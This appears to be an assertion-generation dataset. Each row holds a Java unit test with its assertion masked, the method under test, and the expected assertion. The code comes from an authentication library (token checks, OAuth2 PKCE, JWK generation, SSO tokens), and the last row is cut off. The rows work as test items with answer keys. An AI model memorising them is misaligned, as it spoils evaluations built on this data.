"containsNullKey() { JapCache japCache = new JapLocalCache(); boolean containsKey = japCache.containsKey(null); Assert.""<AssertPlaceHolder>""; }
containsKey(String key) { if (StrUtil.isEmpty(key)) { return false; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); return null != cacheObj && !cacheObj.isExpired(); } finally { readLock.unlock(); } }"	assertFalse(containsKey)
"containsEmptyKey() { JapCache japCache = new JapLocalCache(); boolean containsKey = japCache.containsKey(""""); Assert.""<AssertPlaceHolder>""; }
containsKey(String key) { if (StrUtil.isEmpty(key)) { return false; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); return null != cacheObj && !cacheObj.isExpired(); } finally { readLock.unlock(); } }"	assertFalse(containsKey)
"containsNotEmptyKey() { JapCache japCache = new JapLocalCache(); boolean containsKey = japCache.containsKey(""Key""); Assert.""<AssertPlaceHolder>""; }
containsKey(String key) { if (StrUtil.isEmpty(key)) { return false; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); return null != cacheObj && !cacheObj.isExpired(); } finally { readLock.unlock(); } }"	assertFalse(containsKey)
"getContext() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext); Assert.""<AssertPlaceHolder>""; }
getContext() { return context; }"	assertNotNull(JapAuthentication.getContext())
"getNullUser() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  JapUser japUser = JapAuthentication.getContext().getUserStore().get(request, response); Assert.""<AssertPlaceHolder>""; }
getContext() { return context; }"	assertNull(japUser)
"getUser() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  JapAuthentication.getContext().getUserStore().save(request, response, new JapUser()); JapUser japUser = JapAuthentication.getContext().getUserStore().get(request, response); Assert.""<AssertPlaceHolder>""; }
getContext() { return context; }"	assertNotNull(japUser)
"getUserNullStore() { JapUserStore japUserStore = null; JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  JapUser japUser = JapAuthentication.getUser(request, response); Assert.""<AssertPlaceHolder>""; }
getUser(JapHttpRequest request, JapHttpResponse response) { if (null == context) { return null; } JapUserStore japUserStore = context.getUserStore(); if (null == japUserStore) { return null; } return japUserStore.get(request, response); }"	assertNull(japUser)
"checkNullUser() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  JapResponse japResponse = JapAuthentication.checkUser(request, response); Assert.""<AssertPlaceHolder>""; }
checkUser(JapHttpRequest request, JapHttpResponse response) { JapUser japUser = getUser(request, response); if (null == japUser) { return JapResponse.error(JapErrorCode.NOT_LOGGED_IN); } return JapResponse.success(japUser); }"	assertEquals(japResponse.getCode(), 401)
"checkUser() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  JapAuthentication.getContext().getUserStore().save(request, response, new JapUser()); JapResponse japResponse = JapAuthentication.checkUser(request, response); Assert.""<AssertPlaceHolder>""; }
checkUser(JapHttpRequest request, JapHttpResponse response) { JapUser japUser = getUser(request, response); if (null == japUser) { return JapResponse.error(JapErrorCode.NOT_LOGGED_IN); } return JapResponse.success(japUser); }"	assertEquals(japResponse.getCode(), 200)
"checkTokenNullContext() { Map<String, Object> map = JapAuthentication.checkToken(""aaa""); Assert.""<AssertPlaceHolder>""; }
checkToken(String token) { if (null == context || ObjectUtil.isEmpty(token)) { return null; } JapCache japCache = context.getCache(); if (null == japCache) { return null; } Map<String, Object> tokenMap = JapTokenHelper.checkToken(token); if (MapUtil.isNotEmpty(tokenMap)) { Kv kv = new Kv(); kv.putAll(tokenMap); // Get the token creation time, multiplied by 1000 is the number of milliseconds long iat = kv.getLong(""iat"") * 1000; JapConfig japConfig = context.getConfig(); // Get token expiration time long tokenExpireTime = japConfig.getTokenExpireTime(); // The token is available when the token creation time plus the token expiration time is later than the current time, // otherwise the token has expired if (new Date(iat + tokenExpireTime).after(new Date())) { return tokenMap; } } return null; }"	assertNull(map)
"checkTokenNullCache() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = null; JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  Map<String, Object> map = JapAuthentication.checkToken(""aaa""); Assert.""<AssertPlaceHolder>""; }
checkToken(String token) { if (null == context || ObjectUtil.isEmpty(token)) { return null; } JapCache japCache = context.getCache(); if (null == japCache) { return null; } Map<String, Object> tokenMap = JapTokenHelper.checkToken(token); if (MapUtil.isNotEmpty(tokenMap)) { Kv kv = new Kv(); kv.putAll(tokenMap); // Get the token creation time, multiplied by 1000 is the number of milliseconds long iat = kv.getLong(""iat"") * 1000; JapConfig japConfig = context.getConfig(); // Get token expiration time long tokenExpireTime = japConfig.getTokenExpireTime(); // The token is available when the token creation time plus the token expiration time is later than the current time, // otherwise the token has expired if (new Date(iat + tokenExpireTime).after(new Date())) { return tokenMap; } } return null; }"	assertNull(map)
"checkTokenNullToken() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  Map<String, Object> map = JapAuthentication.checkToken(null); Assert.""<AssertPlaceHolder>""; }
checkToken(String token) { if (null == context || ObjectUtil.isEmpty(token)) { return null; } JapCache japCache = context.getCache(); if (null == japCache) { return null; } Map<String, Object> tokenMap = JapTokenHelper.checkToken(token); if (MapUtil.isNotEmpty(tokenMap)) { Kv kv = new Kv(); kv.putAll(tokenMap); // Get the token creation time, multiplied by 1000 is the number of milliseconds long iat = kv.getLong(""iat"") * 1000; JapConfig japConfig = context.getConfig(); // Get token expiration time long tokenExpireTime = japConfig.getTokenExpireTime(); // The token is available when the token creation time plus the token expiration time is later than the current time, // otherwise the token has expired if (new Date(iat + tokenExpireTime).after(new Date())) { return tokenMap; } } return null; }"	assertNull(map)
"checkTokenNotInCache() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext); String cacheKey = JapConst.USER_TOKEN_KEY.concat(""1111""); japCache.removeKey(cacheKey); Map<String, Object> map = JapAuthentication.checkToken(""eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiIxMTExIiwiaXAiOiIxOTIuMTY4LjEuMTAzIiwiaXNzIjoiamFwIiwidWEiOiJiM2VmOSIsImlhdCI6MTYxNDY3NjA2N30.MK6CBJR98y6UnRBy2coHXrxNJU4N4bZIA05oCgkaNYODdfSRwXhUEqV-OqYsushOxNmUYH0Lp6sKAtrBip0yCw""); System.out.println(map); Assert.""<AssertPlaceHolder>""; }
checkToken(String token) { if (null == context || ObjectUtil.isEmpty(token)) { return null; } JapCache japCache = context.getCache(); if (null == japCache) { return null; } Map<String, Object> tokenMap = JapTokenHelper.checkToken(token); if (MapUtil.isNotEmpty(tokenMap)) { Kv kv = new Kv(); kv.putAll(tokenMap); // Get the token creation time, multiplied by 1000 is the number of milliseconds long iat = kv.getLong(""iat"") * 1000; JapConfig japConfig = context.getConfig(); // Get token expiration time long tokenExpireTime = japConfig.getTokenExpireTime(); // The token is available when the token creation time plus the token expiration time is later than the current time, // otherwise the token has expired if (new Date(iat + tokenExpireTime).after(new Date())) { return tokenMap; } } return null; }"	assertNull(map)
"logout() { JapUserStore japUserStore = new JapUserStoreTest(); JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  boolean result = JapAuthentication.logout(request, response); Assert.""<AssertPlaceHolder>""; }
logout(JapHttpRequest request, JapHttpResponse response) { JapUserStore japUserStore = context.getUserStore(); if (null == japUserStore) { return false; } japUserStore.remove(request, response);  // Clear all cookie information Map<String, JapHttpCookie> cookieMap = RequestUtil.getCookieMap(request); if (CollectionUtil.isNotEmpty(cookieMap)) { cookieMap.forEach((key, cookie) -> { cookie.setMaxAge(0); response.addCookie(cookie); }); } return true; }"	assertTrue(result)
"logoutNullStore() { JapUserStore japUserStore = null; JapCache japCache = new JapLocalCache(); JapConfig japConfig = new JapConfig(); JapContext japContext = new JapContext(japUserStore, japCache, japConfig); JapAuthentication.setContext(japContext);  boolean result = JapAuthentication.logout(request, response); Assert.""<AssertPlaceHolder>""; }
logout(JapHttpRequest request, JapHttpResponse response) { JapUserStore japUserStore = context.getUserStore(); if (null == japUserStore) { return false; } japUserStore.remove(request, response);  // Clear all cookie information Map<String, JapHttpCookie> cookieMap = RequestUtil.getCookieMap(request); if (CollectionUtil.isNotEmpty(cookieMap)) { cookieMap.forEach((key, cookie) -> { cookie.setMaxAge(0); response.addCookie(cookie); }); } return true; }"	assertFalse(result)
"getJwksPublicKey() { String jwks = OidcUtil.getJwksPublicKey(null); Assert.""<AssertPlaceHolder>""; }
getJwksPublicKey(String identity) { String jwksJson = JapIds.getContext().getIdentityService().getJwksJson(identity); JsonWebKeySet jsonWebKeySet = JwtUtil.IdsVerificationKeyResolver.createJsonWebKeySet(jwksJson); return jsonWebKeySet.toJson(JsonWebKey.OutputControlLevel.PUBLIC_ONLY); }"	"assertEquals(""{""keys"":[{""kty"":""RSA"",""kid"":""jap-jwk-keyid"",""use"":""sig"",""alg"":""RS256"",""n"":""hj8zFdhYFi-47PO4B4HTRuOLPR_rpZJi66g4JoY4gyhb5v3Q57etSU9BnW9QQNoUMDvhCFSwkz0hgY5HqVj0zOG5s9x2a594UDIinKsm434b-pT6bueYdvM_mIUEKka5pqhy90wTTka42GvM-rBATHPTarq0kPTR1iBtYao8zX-RWmCbdumEWOkMFUGbBkUcOSJWzoLzN161WdYr2kJU5PFraUP3hG9fPpMEtvqd6IwEL-MOVx3nqc7zk3D91E6eU7EaOy8nz8echQLl6Ps34BSwEpgOhaHDD6IJzetW-KorYeC0r0okXhrl0sUVE2c71vKPVVtueJSIH6OwA3dVHQ"",""e"":""AQAB""}]}"", jwks)"
"getScopes() { List<IdsScope> scopeList = IdsScopeProvider.getScopes(); Assert.""<AssertPlaceHolder>""; }
getScopes() { return SCOPES.stream().collect(Collectors.collectingAndThen( Collectors.toCollection(() -> new TreeSet<>( Comparator.comparing( IdsScope::getCode))), ArrayList::new)); }"	assertNotNull(scopeList)
"getScopeByCodes() { List<IdsScope> scopeList = IdsScopeProvider.getScopeByCodes(Collections.singletonList(""codaae"")); Assert.""<AssertPlaceHolder>""; }
getScopeByCodes(Collection<String> codes) { if (ObjectUtil.isEmpty(codes)) { return new ArrayList<>(0); } return Optional.ofNullable(SCOPES.stream().filter((scope) -> codes.contains(scope.getCode())) .collect(Collectors.collectingAndThen( Collectors.toCollection(() -> new TreeSet<>( Comparator.comparing( IdsScope::getCode))), ArrayList::new))) .orElse(new ArrayList<>(0)); }"	assertEquals(0, scopeList.size())
"getScopeByCodesContainScope() { List<IdsScope> scopeList = IdsScopeProvider.getScopeByCodes(Collections.singletonList(""openid"")); Assert.""<AssertPlaceHolder>""; }
getScopeByCodes(Collection<String> codes) { if (ObjectUtil.isEmpty(codes)) { return new ArrayList<>(0); } return Optional.ofNullable(SCOPES.stream().filter((scope) -> codes.contains(scope.getCode())) .collect(Collectors.collectingAndThen( Collectors.toCollection(() -> new TreeSet<>( Comparator.comparing( IdsScope::getCode))), ArrayList::new))) .orElse(new ArrayList<>(0)); }"	assertNotNull(scopeList)
"getScopeCodes() { List<String> scopeList = IdsScopeProvider.getScopeCodes(); Assert.""<AssertPlaceHolder>""; }
getScopeCodes() { return SCOPES.stream().map(IdsScope::getCode).distinct().collect(Collectors.toList()); }"	assertNotNull(scopeList)
"generateAuthorizationCodeResponseHasCache() { this.initParam(); String code = oauth2Service.createAuthorizationCode(idsRequestParam, new UserInfo(), 100000L); idsRequestParam.setCode(code); IdsResponse<String, Object> response = idsTokenProvider.generateAuthorizationCodeResponse(idsRequestParam, request); System.out.println(response); Assert.""<AssertPlaceHolder>""; }
generateAuthorizationCodeResponse(IdsRequestParam param, JapHttpRequest request) { AuthCode codeInfo = oauth2Service.validateAndGetAuthrizationCode(param.getGrantType(), param.getCode());  String scope = codeInfo.getScope(); UserInfo userInfo = codeInfo.getUser(); String nonce = codeInfo.getNonce();  ClientDetail clientDetail = JapIds.getContext().getClientDetailService().getByClientId(param.getClientId());  OauthUtil.validClientDetail(clientDetail); OauthUtil.validateGrantType(param.getGrantType(), clientDetail.getGrantTypes(), GrantType.AUTHORIZATION_CODE); OauthUtil.validateSecret(param, clientDetail, oauth2Service); OauthUtil.validateRedirectUri(param.getRedirectUri(), clientDetail);  oauth2Service.invalidateCode(param.getCode());  long expiresIn = OauthUtil.getAccessTokenExpiresIn(clientDetail.getAccessTokenExpiresIn());  AccessToken accessToken = TokenUtil.createAccessToken(userInfo, clientDetail, param.getGrantType(), scope, nonce, EndpointUtil.getIssuer(request)); IdsResponse<String, Object> response = new IdsResponse<String, Object>() .add(IdsConsts.ACCESS_TOKEN, accessToken.getAccessToken()) .add(IdsConsts.REFRESH_TOKEN, accessToken.getRefreshToken()) .add(IdsConsts.EXPIRES_IN, expiresIn) .add(IdsConsts.TOKEN_TYPE, IdsConsts.TOKEN_TYPE_BEARER) .add(IdsConsts.SCOPE, scope); if (OauthUtil.isOidcProtocol(scope)) { response.add(IdsConsts.ID_TOKEN, TokenUtil.createIdToken(clientDetail, userInfo, nonce, EndpointUtil.getIssuer(request))); } return response; }"	assertNotNull(response)
"createRsaJsonWebKey() { RsaJsonWebKey rsaJsonWebKey = JwkUtil.createRsaJsonWebKey(""jap-jwks-keyid"", TokenSigningAlg.RS256); Assert.""<AssertPlaceHolder>""; }
createRsaJsonWebKey(String keyId, TokenSigningAlg signingAlg) { if (!Arrays.asList(TokenSigningAlg.RS256, TokenSigningAlg.RS384, TokenSigningAlg.RS512).contains(signingAlg)) { throw new InvalidJwksException(""Unable to create RSA Json Web Key. Unsupported jwk algorithm, only supports RS256, RS384, RS512""); } RsaJsonWebKey jwk = null; try { jwk = RsaJwkGenerator.generateJwk(2048); jwk.setUse(Use.SIGNATURE); jwk.setKeyId(keyId); jwk.setAlgorithm(signingAlg.getAlg()); } catch (JoseException e) { e.printStackTrace(); throw new InvalidJwksException(""Unable to create RSA Json Web Key.""); } return jwk; }"	assertNotNull(rsaJsonWebKey)
"createRsaJsonWebKeyJson() { String jwkJson = JwkUtil.createRsaJsonWebKeyJson(""jap-jwks-keyid"", TokenSigningAlg.RS256); Assert.""<AssertPlaceHolder>""; }
createRsaJsonWebKeyJson(String keyId, TokenSigningAlg signingAlg) { RsaJsonWebKey jwk = createRsaJsonWebKey(keyId, signingAlg); return jwk.toJson(RsaJsonWebKey.OutputControlLevel.INCLUDE_PRIVATE); }"	assertNotNull(jwkJson)
"createRsaJsonWebKeySetJson() { String jwkJson = JwkUtil.createRsaJsonWebKeySetJson(""jap-jwks-keyid"", TokenSigningAlg.RS256); Assert.""<AssertPlaceHolder>""; }
createRsaJsonWebKeySetJson(String keyId, TokenSigningAlg signingAlg) { RsaJsonWebKey jwk = createRsaJsonWebKey(keyId, signingAlg); return new JsonWebKeySet(jwk).toJson(JsonWebKey.OutputControlLevel.INCLUDE_PRIVATE); }"	assertNotNull(jwkJson)
"createEsJsonWebKey() { EllipticCurveJsonWebKey ellipticCurveJsonWebKey = JwkUtil.createEsJsonWebKey(""jap-jwks-keyid"", TokenSigningAlg.ES256); Assert.""<AssertPlaceHolder>""; }
createEsJsonWebKey(String keyId, TokenSigningAlg signingAlg) { if (!Arrays.asList(TokenSigningAlg.ES256, TokenSigningAlg.ES384, TokenSigningAlg.ES512).contains(signingAlg)) { throw new InvalidJwksException(""Unable to create ES Json Web Key. Unsupported jwk algorithm, only supports ES256, ES384, ES512""); } EllipticCurveJsonWebKey jwk = null;  ECParameterSpec spec = null; if (signingAlg == TokenSigningAlg.ES256) { spec = EllipticCurves.P256; } else if (signingAlg == TokenSigningAlg.ES384) { spec = EllipticCurves.P384; } else { spec = EllipticCurves.P521; }  try { jwk = EcJwkGenerator.generateJwk(spec); jwk.setUse(Use.SIGNATURE); jwk.setKeyId(keyId); jwk.setAlgorithm(signingAlg.getAlg()); } catch (JoseException e) { e.printStackTrace(); throw new InvalidJwksException(""Unable to create ES Json Web Key.""); } return jwk; }"	assertNotNull(ellipticCurveJsonWebKey)
"createEsJsonWebKeyJson() { String jwkJson = JwkUtil.createEsJsonWebKeyJson(""jap-jwks-keyid"", TokenSigningAlg.ES256); Assert.""<AssertPlaceHolder>""; }
createEsJsonWebKeyJson(String keyId, TokenSigningAlg signingAlg) { EllipticCurveJsonWebKey jwk = createEsJsonWebKey(keyId, signingAlg); return jwk.toJson(RsaJsonWebKey.OutputControlLevel.INCLUDE_PRIVATE); }"	assertNotNull(jwkJson)
"createEsJsonWebKeySetJson() { String jwkJson = JwkUtil.createEsJsonWebKeySetJson(""jap-jwks-keyid"", TokenSigningAlg.ES256); Assert.""<AssertPlaceHolder>""; }
createEsJsonWebKeySetJson(String keyId, TokenSigningAlg signingAlg) { EllipticCurveJsonWebKey jwk = createEsJsonWebKey(keyId, signingAlg); return new JsonWebKeySet(jwk).toJson(JsonWebKey.OutputControlLevel.INCLUDE_PRIVATE); }"	assertNotNull(jwkJson)
"authenticateNullConfig() { JapUserService japUserService = getJapUserService(); Oauth2Strategy oauth2Strategy = new Oauth2Strategy(japUserService, new JapConfig());  JapResponse response = oauth2Strategy.authenticate(null, this.request, this.response); Assert.""<AssertPlaceHolder>""; }
authenticate(AuthenticateConfig config, JapHttpRequest request, JapHttpResponse response) {  try { Oauth2Util.checkOauthCallbackRequest(request.getParameter(""error""), request.getParameter(""error_description""), ""Oauth2strategy request failed.""); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  JapUser sessionUser = this.checkSession(request, response); if (null != sessionUser) { return JapResponse.success(sessionUser); }  try { this.checkAuthenticateConfig(config, OAuthConfig.class); } catch (JapException e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); } OAuthConfig authConfig = (OAuthConfig) config;  try { Oauth2Util.checkOauthConfig(authConfig); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  boolean isPasswordOrClientMode = authConfig.getGrantType() == Oauth2GrantType.PASSWORD || authConfig.getGrantType() == Oauth2GrantType.CLIENT_CREDENTIALS;  // If it is not a callback request, it must be a request to jump to the authorization link // If it is a password authorization request or a client authorization request, the token will be obtained directly if (!Oauth2Util.isCallback(request, authConfig) && !isPasswordOrClientMode) { String authorizationUrl = getAuthorizationUrl(authConfig); return JapResponse.success(authorizationUrl); } else { AccessToken accessToken = null; try { accessToken = AccessTokenHelper.getToken(request, authConfig); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); } JapUser japUser = null; try { japUser = getUserInfo(authConfig, accessToken); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  if (null == japUser) { return JapResponse.error(JapErrorCode.UNABLE_SAVE_USERINFO); } return this.loginSuccess(japUser, request, response); } }"	assertEquals(1005, response.getCode())
"authenticateNotOAuthConfig() { JapUserService japUserService = getJapUserService(); Oauth2Strategy oauth2Strategy = new Oauth2Strategy(japUserService, new JapConfig());  JapResponse response = oauth2Strategy.authenticate(new NotOAuthConfig(), this.request, this.response); Assert.""<AssertPlaceHolder>""; }
authenticate(AuthenticateConfig config, JapHttpRequest request, JapHttpResponse response) {  try { Oauth2Util.checkOauthCallbackRequest(request.getParameter(""error""), request.getParameter(""error_description""), ""Oauth2strategy request failed.""); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  JapUser sessionUser = this.checkSession(request, response); if (null != sessionUser) { return JapResponse.success(sessionUser); }  try { this.checkAuthenticateConfig(config, OAuthConfig.class); } catch (JapException e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); } OAuthConfig authConfig = (OAuthConfig) config;  try { Oauth2Util.checkOauthConfig(authConfig); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  boolean isPasswordOrClientMode = authConfig.getGrantType() == Oauth2GrantType.PASSWORD || authConfig.getGrantType() == Oauth2GrantType.CLIENT_CREDENTIALS;  // If it is not a callback request, it must be a request to jump to the authorization link // If it is a password authorization request or a client authorization request, the token will be obtained directly if (!Oauth2Util.isCallback(request, authConfig) && !isPasswordOrClientMode) { String authorizationUrl = getAuthorizationUrl(authConfig); return JapResponse.success(authorizationUrl); } else { AccessToken accessToken = null; try { accessToken = AccessTokenHelper.getToken(request, authConfig); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); } JapUser japUser = null; try { japUser = getUserInfo(authConfig, accessToken); } catch (JapOauth2Exception e) { return JapResponse.error(e.getErrorCode(), e.getErrorMessage()); }  if (null == japUser) { return JapResponse.error(JapErrorCode.UNABLE_SAVE_USERINFO); } return this.loginSuccess(japUser, request, response); } }"	assertEquals(500, response.getCode())
"generateCodeChallengeCodeChallengeMethodIsS256() { String s256Challenge = Oauth2Util.generateCodeChallenge(PkceCodeChallengeMethod.S256, ""asdasdasdasd""); Assert.""<AssertPlaceHolder>""; }
generateCodeChallenge(PkceCodeChallengeMethod codeChallengeMethod, String codeVerifier) { if (PkceCodeChallengeMethod.S256 == codeChallengeMethod) { // https://tools.ietf.org/html/rfc7636#section-4.2 // code_challenge = BASE64URL-ENCODE(SHA256(ASCII(code_verifier))) return Base64.encodeUrlSafe(SecureUtil.sha256().digest(codeVerifier)); } else { return codeVerifier; } }"	"assertEquals(""ZrETKgFzkQsB7joV705pWDu_L38eRGLJnvvhuatb-Ag"", s256Challenge)"
"generateCodeChallengeCodeChallengeMethodIsPlain() { String plainChallenge = Oauth2Util.generateCodeChallenge(PkceCodeChallengeMethod.PLAIN, ""asdasdasdasd""); Assert.""<AssertPlaceHolder>""; }
generateCodeChallenge(PkceCodeChallengeMethod codeChallengeMethod, String codeVerifier) { if (PkceCodeChallengeMethod.S256 == codeChallengeMethod) { // https://tools.ietf.org/html/rfc7636#section-4.2 // code_challenge = BASE64URL-ENCODE(SHA256(ASCII(code_verifier))) return Base64.encodeUrlSafe(SecureUtil.sha256().digest(codeVerifier)); } else { return codeVerifier; } }"	"assertEquals(""asdasdasdasd"", plainChallenge)"
"generateCodeVerifier() { String verifier = Oauth2Util.generateCodeVerifier(); System.out.println(verifier); Assert.""<AssertPlaceHolder>""; }
generateCodeVerifier() { return Base64.encode(RandomUtil.randomString(50), ""UTF-8""); }"	assertEquals(68, verifier.length())
"isCallbackCodeResponseType() { boolean res = Oauth2Util.isCallback(request, new OAuthConfig() .setResponseType(Oauth2ResponseType.CODE)); Assert.""<AssertPlaceHolder>""; }
isCallback(JapHttpRequest request, OAuthConfig oAuthConfig) { if (oAuthConfig.getResponseType() == Oauth2ResponseType.CODE) { String code = request.getParameter(""code""); return !StrUtil.isEmpty(code); } else if (oAuthConfig.getResponseType() == Oauth2ResponseType.TOKEN) { String accessToken = request.getParameter(""access_token""); return !StrUtil.isEmpty(accessToken); } return false; }"	assertFalse(res)
"isCallbackTokenResponseType() { boolean res = Oauth2Util.isCallback(request, new OAuthConfig() .setResponseType(Oauth2ResponseType.TOKEN)); Assert.""<AssertPlaceHolder>""; }
isCallback(JapHttpRequest request, OAuthConfig oAuthConfig) { if (oAuthConfig.getResponseType() == Oauth2ResponseType.CODE) { String code = request.getParameter(""code""); return !StrUtil.isEmpty(code); } else if (oAuthConfig.getResponseType() == Oauth2ResponseType.TOKEN) { String accessToken = request.getParameter(""access_token""); return !StrUtil.isEmpty(accessToken); } return false; }"	assertFalse(res)
"isCallbackNoneResponseType() { boolean res = Oauth2Util.isCallback(request, new OAuthConfig() .setResponseType(Oauth2ResponseType.NONE)); Assert.""<AssertPlaceHolder>""; }
isCallback(JapHttpRequest request, OAuthConfig oAuthConfig) { if (oAuthConfig.getResponseType() == Oauth2ResponseType.CODE) { String code = request.getParameter(""code""); return !StrUtil.isEmpty(code); } else if (oAuthConfig.getResponseType() == Oauth2ResponseType.TOKEN) { String accessToken = request.getParameter(""access_token""); return !StrUtil.isEmpty(accessToken); } return false; }"	assertFalse(res)
"getCacheCodeVerifierNullClientId() { String res = PkceHelper.getCacheCodeVerifier(null); Assert.""<AssertPlaceHolder>""; }
getCacheCodeVerifier(String clientId) { return (String) JapAuthentication.getContext().getCache().get(clientId); }"	assertNull(res)
"createSsoToken() { when(httpServletRequestMock.getHeader(""x-forwarded-for"")).thenReturn(""127.0.0.1""); when(httpServletRequestMock.getHeader(""user-agent"")).thenReturn(""ua""); SSOToken ssoToken = JapSsoUtil.createSsoToken(""userId"", ""userName"", request); System.out.println(ssoToken); Assert.""<AssertPlaceHolder>""; }
createSsoToken(Object userId, String username, JapHttpRequest request) { return new SSOToken() .setId(userId) .setIssuer(username) .setIp(getIp(request)) .setUserAgent(RequestUtil.getUa(request)) .setTime(System.currentTimeMillis()); }"	assertNotNull(ssoToken)
"createToken() { when(httpServletRequestMock.getHeader(""x-forwarded-for"")).thenReturn(""127.0.0.1""); when(httpServletRequestMock.getHeader(""user-agent"")).thenReturn(""ua""); String token = JapSsoUtil.createToken(""userId"", ""userName"", request); System.out.println(token); Assert.""<AssertPlaceHolder>""; }
createToken(Object userId, String username, JapHttpRequest request) { return createSsoToken(userId, username, request).getToken(); }"	assertNotNull(token)
"parseToken() { String token = ""eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJ1c2VySWQiLCJpcCI6IjEyNy4wLjAuMSIsImlzcyI6InVzZXJOYW1lIiwidWEiOiI5ZjRkNyIsImlhdCI6MTYxNDU3MzkyM30.A4Z6LSJoIu_scS6L1J13GaSgmEpQCxiRqpHDByIZ_S34cTFnamEKozPvRJZqFoGQbKFWsxOmTH7wepaM9ru5Aw""; SSOToken ssoToken = JapSsoUtil.parseToken(token); System.out.println(ssoToken.getClaims()); Assert.""<AssertPlaceHolder>""; }
parseToken(String token) { try { return SSOToken.parser(token); } catch (Exception e) { return null; } }"	"assertEquals(""{jti=userId, ip=127.0.0.1, iss=userName, ua=9f4d7, iat=1614573923}"", ssoToken.getClaims().toString())"
"parseInvalidToken() { String token = ""InvalidToken""; SSOToken ssoToken = JapSsoUtil.parseToken(token); Assert.""<AssertPlaceHolder>""; }
parseToken(String token) { try { return SSOToken.parser(token); } catch (Exception e) { return null; } }"	assertNull(ssoToken)
"testQueryClassesWithAnnotationsSimple() { try (AnnotationHandler annotationHandler = new AnnotationHandler(configureWrapper)) { List<String> simpleClassList = annotationHandler.queryClassesWithAnnotation(true, Configuration.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(simpleClassList, ""simpleClassList""); } }
queryClassesWithAnnotation(boolean querySimpleClassName, String annotationClassName) { SqlKeyEnum sqlKeyEnum = querySimpleClassName ? SqlKeyEnum.CA_QUERY_SIMPLE_CLASS_NAME_WITH_ANNOTATION : SqlKeyEnum.CA_QUERY_CLASS_NAME_WITH_ANNOTATION; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select distinct "" + (querySimpleClassName ? DC.CA_SIMPLE_CLASS_NAME : DC.CA_CLASS_NAME) + "" from "" + DbTableInfoEnum.DTIE_CLASS_ANNOTATION.getTableName() + "" where "" + DC.CA_ANNOTATION_NAME + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } return dbOperator.queryListOneColumn(sql, String.class, annotationClassName); }"	assertFalse(JavaCGUtil.isCollectionEmpty(simpleClassList))
"testQueryClassesWithAnnotationsFull() { try (AnnotationHandler annotationHandler = new AnnotationHandler(configureWrapper)) { List<String> classList = annotationHandler.queryClassesWithAnnotation(false, RequestMapping.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(classList, ""classList""); } }
queryClassesWithAnnotation(boolean querySimpleClassName, String annotationClassName) { SqlKeyEnum sqlKeyEnum = querySimpleClassName ? SqlKeyEnum.CA_QUERY_SIMPLE_CLASS_NAME_WITH_ANNOTATION : SqlKeyEnum.CA_QUERY_CLASS_NAME_WITH_ANNOTATION; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select distinct "" + (querySimpleClassName ? DC.CA_SIMPLE_CLASS_NAME : DC.CA_CLASS_NAME) + "" from "" + DbTableInfoEnum.DTIE_CLASS_ANNOTATION.getTableName() + "" where "" + DC.CA_ANNOTATION_NAME + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } return dbOperator.queryListOneColumn(sql, String.class, annotationClassName); }"	assertFalse(JavaCGUtil.isCollectionEmpty(classList))
"testQueryMethodsWithAnnotationsMethodHash() { try (AnnotationHandler annotationHandler = new AnnotationHandler(configureWrapper)) { List<String> methodHashList = annotationHandler.queryMethodsWithAnnotation(false, Bean.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(methodHashList, ""methodHashList""); } }
